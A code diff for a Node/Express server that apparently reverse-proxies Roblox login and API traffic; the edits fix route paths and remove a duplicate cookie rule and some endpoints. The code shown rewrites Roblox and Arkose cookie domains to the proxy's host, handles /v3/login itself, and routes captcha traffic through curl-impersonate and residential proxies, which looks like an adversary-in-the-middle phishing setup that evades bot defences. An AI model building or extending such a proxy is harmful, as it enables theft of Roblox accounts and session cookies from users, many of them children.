@@ -93,7 +93,6 @@ function rewriteCookies(cookies, host) {
         c.replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
          .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
          .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${cleanHost}`)
-         .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
          .replace(/\bSecure\b/gi, 'Secure; SameSite=None')
     );
 }
@@ -382,7 +381,6 @@ app.use('/v3/login', express.raw({ type: '*/*' }), loginHandler);
 
 // ─────────────────────────────────────────────────────────────
 // UNIVERSAL CURL-IMPERSONATE PROXY (for ALL API routes)
-// Replaces the standard http-proxy-middleware for API routes
 // ─────────────────────────────────────────────────────────────
 function createCurlProxy(targetHost, pathPrefix, useResidentialProxy = false) {
     return async (req, res) => {
@@ -503,12 +501,12 @@ const API_ROUTES = [
 
     // Experimentation & config
     ['/product-experimentation-platform', 'apis.roblox.com', '/product-experimentation-platform'],
-    ['/universal-app-configuration',      'apis.roblox.com'],
+    ['/universal-app-configuration',      'apis.roblox.com', '/universal-app-configuration'],
     ['/guac-v2',                          'apis.roblox.com', '/guac-v2'],
 
     // OTP & captcha
     ['/otp-service',                      'apis.roblox.com', '/otp-service'],
-    ['/captcha',                          'apis.roblox.com'],
+    ['/captcha',                          'apis.roblox.com', '/captcha'],
 
     // Core APIs
     ['/v1/account-information',           'accountinformation.roblox.com'],
@@ -534,10 +532,6 @@ const API_ROUTES = [
     ['/v1/games',                         'games.roblox.com'],
     ['/v2/games',                         'games.roblox.com'],
 
-    // Behaviors endpoints
-    ['/v1/behaviors',                     'apis.roblox.com', '/v1/behaviors'],
-    ['/v1/metadata',                      'apis.roblox.com', '/v1/metadata'],
-
     // Reporting (non-critical)
     ['/game/report-event',                'www.roblox.com'],
     ['/ecsv2-api',                        'ecsv2.roblox.com'],
@@ -548,7 +542,7 @@ const API_ROUTES = [
 // Register Arkose routes with residential proxy
 for (const [prefix, target] of ARKOSE_ROUTES) {
     const targetHost = target.replace(/^https?:\/\//, '').replace(/\/+$/, '');
-    app.use(prefix, createCurlProxy(targetHost, '', true)); // use residential proxy
+    app.use(prefix, createCurlProxy(targetHost, '', true));
 }
 
 // Register API routes with curl-impersonate (no residential proxy by default)
